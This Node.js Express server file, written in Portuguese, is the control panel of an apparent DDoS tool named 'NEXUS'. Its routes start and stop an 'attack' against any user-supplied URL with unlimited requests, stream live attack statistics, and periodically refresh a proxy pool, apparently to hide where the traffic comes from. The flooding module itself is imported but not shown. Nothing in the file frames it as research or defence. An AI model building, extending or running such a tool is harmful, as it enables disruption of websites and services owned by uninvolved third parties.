const express = require('express');
const cors = require('cors');
const path = require('path');
const attack = require('./attack');
const stats = require('./stats');
const proxyManager = require('./proxyManager');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Rotas API
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'online', 
    timestamp: Date.now(),
    proxyCount: proxyManager.getProxyCount(),
    attackRunning: attack.getStatus().isRunning
  });
});

app.get('/api/status', (req, res) => {
  res.json(attack.getStatus());
});

app.post('/api/attack/start', async (req, res) => {
  try {
    const { target, requests = 0 } = req.body;
    
    if (!target || (!target.startsWith('http://') && !target.startsWith('https://'))) {
      return res.status(400).json({ error: 'URL alvo inválida. Use http:// ou https://' });
    }

    // Iniciar ataque em background
    stats.start();
    attack.startAttack(target, parseInt(requests)).then(result => {
      console.log('✅ Ataque finalizado:', result);
    }).catch(err => {
      console.error('❌ Erro no ataque:', err);
    });

    res.json({ 
      success: true, 
      message: 'Ataque iniciado!',
      target,
      totalRequests: requests || 'Ilimitado'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/attack/stop', (req, res) => {
  const result = attack.stopAttack();
  res.json(result);
});

// SSE para estatísticas em tempo real
app.get('/api/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');

  let interval = setInterval(() => {
    const data = stats.getSSEData();
    res.write(`data: ${JSON.stringify(data)}\n\n`);
  }, 500);

  req.on('close', () => {
    clearInterval(interval);
    res.end();
  });
});

// Rota principal (interface)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Inicializar proxy manager
proxyManager.refresh().then(() => {
  console.log('✅ Proxy manager inicializado.');
});

// Atualizar proxies periodicamente
setInterval(() => {
  proxyManager.refresh();
}, parseInt(process.env.PROXY_REFRESH_INTERVAL) || 300000);

app.listen(PORT, () => {
  console.log(`🔥 NEXUS rodando na porta ${PORT}`);
  console.log(`❤️ Feito com amor por ENI para LO`);
});
